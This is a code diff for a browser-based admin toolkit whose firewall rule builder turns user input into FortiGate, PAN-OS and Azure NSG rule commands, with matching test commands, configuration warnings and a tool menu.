+        fgt.push('config firewall policy', '    edit 0', `        set name "${name.slice(0, 35)}"`, `        set srcintf "${st.fgtIn || 'any'}"`, `        set dstintf "${st.fgtOut || 'any'}"`,
+          `        set srcaddr ${fNames(src)}`, `        set dstaddr ${fNames(dst)}`, `        set action ${allow ? 'accept' : 'deny'}`, '        set schedule "always"', `        set service ${fSvc}`);
+        if (st.log) fgt.push('        set logtraffic all');
+        if (allow && st.nat) fgt.push('        set nat enable');
+        if (allow && st.sec) fgt.push('        set utm-status enable', '        set ssl-ssh-profile "certificate-inspection"', '        set av-profile "default"', '        set ips-sensor "default"');
+        if (st.desc.trim()) fgt.push(`        set comments "${st.desc.trim().replace(/"/g, "'")}"`);
+        fgt.push('    next', 'end');
+        if (name.length > 35) lint.push('FortiGate policy names are limited to 35 characters; the FortiGate name is trimmed.');
+
+        // PAN-OS
+        const pre = st.panDg.trim() ? `set device-group ${q(st.panDg.trim())} ` : 'set ';
+        const rb = st.panDg.trim() ? 'pre-rulebase' : 'rulebase';
+        const pan = [];
+        objs([...src, ...dst]).filter((a, i, arr) => arr.findIndex(x => x.name === a.name) === i).forEach(a => {
+          if (a.kind === 'host' || a.kind === 'net') pan.push(`${pre}address ${a.name} ip-netmask ${a.ip}/${a.p}`);
+          if (a.kind === 'range') pan.push(`${pre}address ${a.name} ip-range ${a.a}-${a.b}`);
+          if (a.kind === 'fqdn') pan.push(`${pre}address ${q(a.name)} fqdn ${a.raw}`);
+        });
+        const useApp = st.appid && !svcAny;
+        const apps = useApp ? [...new Set([...ports.map(p => PAN_APP[p.key]), ...(svc.some(s => s.kind === 'icmp') ? ['icmp'] : [])])] : [];
+        const appGap = useApp && apps.includes(undefined);
+        if (!useApp || appGap) ports.filter(p => !PAN_SVC[p.key]).filter((p, i, arr) => arr.findIndex(x => x.name === p.name) === i).forEach(p => pan.push(`${pre}service ${p.name} protocol ${p.proto} port ${p.port}`));
+        const pList = arr => arr.length === 1 ? arr[0] : `[ ${arr.join(' ')} ]`;
+        const pAddr = arr => arr.some(a => a.kind === 'any') || !objs(arr).length ? 'any' : pList(objs(arr).map(a => q(a.name)));
+        const R = `${pre}${rb} security rules ${q(name)}`;
+        let pApp = 'any', pSvc = 'any';
+        if (useApp && !appGap) { pApp = pList(apps); pSvc = 'application-default'; }
+        else if (!svcAny) pSvc = pList(ports.map(p => PAN_SVC[p.key] || p.name));
+        if (appGap) lint.push(`No App-ID mapping for ${ports.filter(p => !PAN_APP[p.key]).map(p => `<code>${p.key}</code>`).join(', ')}, so PAN-OS uses port-based services. Pick the right App-ID in the rule later.`);
+        if (useApp && svc.some(s => s.kind === 'icmp') && ports.length === 0) { pApp = 'icmp'; pSvc = 'application-default'; }
+        pan.push(`${R} from ${q(st.panFrom || 'any')} to ${q(st.panTo || 'any')}`, `${R} source ${pAddr(src)} destination ${pAddr(dst)}`,
+          `${R} application ${pApp} service ${pSvc}`, `${R} action ${allow ? 'allow' : 'deny'}`);
+        if (st.log) { pan.push(`${R} log-end yes`); if (st.panLog.trim()) pan.push(`${R} log-setting ${q(st.panLog.trim())}`); }
+        if (allow && st.sec && st.panProfile.trim()) pan.push(`${R} profile-setting group ${q(st.panProfile.trim())}`);
+        if (st.desc.trim()) pan.push(`${R} description "${st.desc.trim().replace(/"/g, "'")}"`);
+        if (allow && st.nat) pan.push(`# Source NAT is a separate NAT rule on PAN-OS:`, `${pre}${rb} nat rules ${q(name + '-SNAT')} from ${q(st.panFrom || 'any')} to ${q(st.panTo || 'any')} source ${pAddr(src)} destination any service any source-translation dynamic-ip-and-port interface-address interface <egress-interface>`);
+        pan.push(st.panDg.trim() ? 'commit\ncommit-all shared-policy device-group ' + q(st.panDg.trim()) : 'commit');
+        if (allow && pApp === 'any' && pSvc === 'any') lint.push('PAN-OS rule with <b>application any</b> and <b>service any</b>. Use App-ID or specific services.');
+
+        // NSG
+        const nsgAddr = arr => {
+          if (!arr.length || arr.some(a => a.kind === 'any')) return ['*'];
+          const r = arr.filter(a => a.kind !== 'bad' && a.kind !== 'fqdn').flatMap(a => a.kind === 'host' ? [a.ip] : a.kind === 'net' ? [`${a.ip}/${a.p}`] : a.kind === 'tag' ? [a.raw] : a.kind === 'range' ? [`${a.a}-${a.b}`] : []);
+          return r.length ? r : ['<service-tag-or-cidr>'];
+        };
+        const fq = [...src, ...dst].filter(a => a.kind === 'fqdn');
+        if (fq.length) lint.push('<b>NSGs don\'t support FQDNs.</b> They were left out of the NSG rule' + ([src, dst].some(l => l.length && l.every(a => a.kind === 'fqdn')) ? ', and a <code>&lt;service-tag-or-cidr&gt;</code> placeholder was put in their place' : '') + '. Use a service tag (for example AzureMonitor) or Azure Firewall application rules.');
+        if (allow && st.sec && dst.some(a => /monitor\.azure\.com|opinsights\.azure\.com|handler\.control/i.test(a.raw))) lint.push('These look like <b>Azure Monitor Agent</b> endpoints. Make sure no SSL/TLS decryption (deep inspection) applies to them; AMA breaks under HTTPS inspection.');
+        if ([...src, ...dst].some(a => a.kind === 'range')) lint.push('NSG address prefixes take CIDRs or service tags. Convert the IP range to CIDRs before deploying.');
+        const protos = [...new Set(svc.filter(s => s.kind !== 'bad').map(s => s.kind === 'port' ? s.proto : s.kind === 'icmp' ? 'icmp' : '*'))];
+        const nsgProto = svcAny || protos.length > 1 ? '*' : { tcp: 'Tcp', udp: 'Udp', icmp: 'Icmp' }[protos[0]] || '*';
+        if (protos.length > 1 && !svcAny) lint.push('The NSG rule mixes TCP and UDP, so protocol is set to <b>Any</b>. Split it into two rules if you want it exact.');
+        const nsgPorts = svcAny || nsgProto === 'Icmp' ? ['*'] : [...new Set(ports.map(p => p.port))];
+        const prio = Math.min(4096, Math.max(100, parseInt(st.nsgPrio, 10) || 200));
+        const nsgName = name.replace(/[^A-Za-z0-9_.-]/g, '-').slice(0, 80);
+        const sa = nsgAddr(src), da = nsgAddr(dst);
+        const nsg = `az network nsg rule create \\\n  --resource-group ${q(st.nsgRg || '<rg>')} --nsg-name ${q(st.nsgName || '<nsg>')} \\\n  --name ${nsgName} --priority ${prio} --direction ${st.nsgDir} \\\n  --access ${allow ? 'Allow' : 'Deny'} --protocol ${nsgProto === '*' ? "'*'" : nsgProto} \\\n  --source-address-prefixes ${sa.map(x => x === '*' || x.includes('<') ? `'${x}'` : x).join(' ') || "'*'"} --source-port-ranges '*' \\\n  --destination-address-prefixes ${da.map(x => x === '*' || x.includes('<') ? `'${x}'` : x).join(' ') || "'*'"} \\\n  --destination-port-ranges ${nsgPorts.map(x => x === '*' ? "'*'" : x).join(' ')}${st.desc.trim() ? ` \\\n  --description "${st.desc.trim().replace(/"/g, "'")}"` : ''}`;
+
+        // tests
+        const tSrc = src.find(a => a.kind === 'host' || a.kind === 'net'), tDst = dst.find(a => a.kind === 'host' || a.kind === 'net');
+        const sIp = tSrc ? tSrc.ip : '192.0.2.10', dIp = tDst ? tDst.ip : (dst.find(a => a.kind === 'fqdn') ? '<resolved-ip>' : '10.0.0.10');
+        const tp = ports[0], tProto = tp ? (tp.proto === 'tcp' ? 6 : 17) : (svc.some(s => s.kind === 'icmp') ? 1 : 6), tPort = tp ? tp.a : 443;
+        const testFgt = `diagnose debug reset\ndiagnose debug flow filter addr ${dIp}\ndiagnose debug flow filter port ${tPort}\ndiagnose debug flow show function-name enable\ndiagnose debug enable\ndiagnose debug flow trace start 20\n# ...generate traffic, then stop:\ndiagnose debug disable`;
+        const testPan = `test security-policy-match from ${st.panFrom || 'any'} to ${st.panTo || 'any'} source ${sIp} destination ${dIp} destination-port ${tPort} protocol ${tProto}${useApp && apps[0] ? ` application ${apps[0]}` : ''}`;
+        const testNsg = `# IP flow verify (Network Watcher)\naz network watcher test-ip-flow \\\n  --vm <vm-name> --resource-group ${st.nsgRg || '<rg>'} \\\n  --direction ${st.nsgDir} --protocol ${nsgProto === '*' || nsgProto === 'Icmp' ? 'TCP' : nsgProto.toUpperCase()} \\\n  --local ${st.nsgDir === 'Inbound' ? dIp : sIp}:${st.nsgDir === 'Inbound' ? tPort : 60000} --remote ${st.nsgDir === 'Inbound' ? sIp : dIp}:${st.nsgDir === 'Inbound' ? 60000 : tPort}`;
+
+        return { fgt: fgt.join('\n'), pan: pan.join('\n'), nsg, testFgt, testPan, testNsg, lint, errs, name };
+      }
+
+      function run() {
+        const r = build();
+        const block = (title, sub, code, test, testLabel) => `
+          <div class="w-sec vendor-out">
+            <h3><span>${title} <span class="sub">${sub}</span></span><span class="row-actions"><button class="btn sm" data-copy="${esc(code)}" data-label="${esc(title)} config">Copy</button></span></h3>
+            <pre class="code">${esc(code)}</pre>
+            <details class="test"><summary>${testLabel}</summary><div class="cmd-h" style="margin-top:8px"><span></span><button class="btn sm" data-copy="${esc(test)}" data-label="${esc(title)} test">Copy</button></div><pre class="code">${esc(test)}</pre></details>
+          </div>`;
+        out.innerHTML = `
+          ${r.errs.length ? `<div class="w-sec"><div class="err"><svg class="i"><use href="#i-warn"/></svg><span>${r.errs.join('<br>')}</span></div></div>` : ''}
+          <div class="w-sec">
+            <h3>Review</h3>
+            ${r.lint.length ? `<ul class="gotchas">${r.lint.map(x => `<li><span>${x}</span></li>`).join('')}</ul>` : '<div class="summary" style="margin:0"><span class="pill g">No issues found</span></div>'}
+          </div>
+          ${block('FortiGate', 'FortiOS CLI', r.fgt, r.testFgt, 'Test with a debug flow trace')}
+          ${block('Palo Alto', 'PAN-OS configure mode' + (st.panDg.trim() ? ' · Panorama' : ''), r.pan, r.testPan, 'Test with security-policy-match')}
+          ${block('Azure NSG', 'Azure CLI', r.nsg, r.testNsg, 'Test with Network Watcher IP flow verify')}
+          <div class="w-sec"><p class="hint-line" style="margin:0">Review before you paste into production. Object names are generated (H- host, N- network, R- range, FQDN-); rename them to your naming convention. FortiGate security profiles use the default profile names.</p></div>`;
+      }
+
+      w.addEventListener('input', e => { const k = e.target.dataset.k; if (k) { st[k] = e.target.value; run(); } });
+      w.addEventListener('change', e => { const k = e.target.dataset.kb; if (k) { st[k] = e.target.checked; run(); } });
+      w.addEventListener('click', e => {
+        const s = e.target.closest('[data-fs]');
+        if (s) {
+          Object.assign(st, SAMPLES[s.dataset.fs]);
+          w.querySelectorAll('[data-k]').forEach(i => i.value = st[i.dataset.k] ?? '');
+          w.querySelectorAll('[data-kb]').forEach(i => i.checked = !!st[i.dataset.kb]);
+          w.querySelectorAll('[data-fk]').forEach(seg => seg.querySelectorAll('button').forEach(b => b.setAttribute('aria-pressed', b.dataset.fv === st[seg.dataset.fk])));
+          return run();
+        }
+        const b = e.target.closest('[data-fk] button'); if (!b) return;
+        const seg = b.parentElement; st[seg.dataset.fk] = b.dataset.fv;
+        seg.querySelectorAll('button').forEach(x => x.setAttribute('aria-pressed', x === b));
+        run();
+      });
+      run();
+    }
+
+    /* ---------- registry + routing ---------- */
+    const TOOLS = [
+      { id: 'cef', name: 'CEF parser', desc: 'Map CEF to CommonSecurityLog', icon: 't-cef', render: renderCef },
+      { id: 'ama', name: 'AMA connectivity', desc: 'Endpoints, DNS, private link', icon: 't-ama', render: renderAma },
+      { id: 'dcr', name: 'DCR builder', desc: 'AMA data collection rules', icon: 't-dcr', render: renderDcr },
+      { id: 'fw', name: 'Firewall rule builder', desc: 'FortiGate, PAN-OS, NSG', icon: 't-fw', render: renderFw },
+      { id: 'time', name: 'Time converter', desc: 'Epoch, ISO, FILETIME, KQL', icon: 't-time', render: renderTime },
+      { id: 'cidr', name: 'CIDR calculator', desc: 'Subnets and IP-in-range', icon: 't-cidr', render: renderCidr },
+      { id: 'jwt', name: 'JWT decoder', desc: 'Read Entra token claims', icon: 't-jwt', render: renderJwt },
+      { id: 'encode', name: 'Encoder / decoder', desc: 'Base64, URL, hex, PS', icon: 't-enc', render: renderEnc }
+    ];
+    const side = $('#side'), work = $('#work');
+    side.innerHTML = TOOLS.map(t => `<button class="tool-btn" role="tab" data-tool="${t.id}" aria-selected="false"><span class="ico"><svg aria-hidden="true"><use href="#${t.icon}"/></svg></span><span><b>${t.name}</b><small>${t.desc}</small></span></button>`).join('')
+      + `<div class="side-note">More coming: IOC extractor, event ID lookup, KQL formatter.</div>`;
+    function open(id, push = true) {
+      const t = TOOLS.find(x => x.id === id) || TOOLS[0];
+      side.querySelectorAll('.tool-btn').forEach(b => b.setAttribute('aria-selected', b.dataset.tool === t.id));
+      t.render(work);
+      document.title = `${t.name} · NoxCipher Tools`;
+      if (push) { try { history.replaceState(null, '', '#' + t.id); } catch {} }
+    }
+    side.addEventListener('click', e => { const b = e.target.closest('.tool-btn'); if (b) { open(b.dataset.tool); if (innerWidth <= 900) work.scrollIntoView({ behavior: 'smooth', block: 'start' }); } });
+    addEventListener('hashchange', () => open(location.hash.slice(1), false));
+    open(location.hash.slice(1), false);
+  })();
+  </script>
+</body>
+</html>
